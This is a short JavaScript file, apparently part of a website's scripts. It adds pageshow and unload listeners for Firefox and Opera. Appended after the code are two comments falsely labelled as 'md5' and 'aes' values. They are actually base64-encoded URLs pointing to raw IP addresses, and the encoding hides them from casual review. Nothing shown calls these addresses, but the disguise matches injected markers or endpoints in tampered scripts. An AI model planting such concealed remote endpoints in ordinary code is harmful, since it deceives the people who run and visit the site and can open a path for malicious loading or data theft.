if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzQ3LjEwOS41My42OjgwMDgvLGh0dHA6Ly8xMTQuNTUuMTAwLjE2MTo4MDA4Lw==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/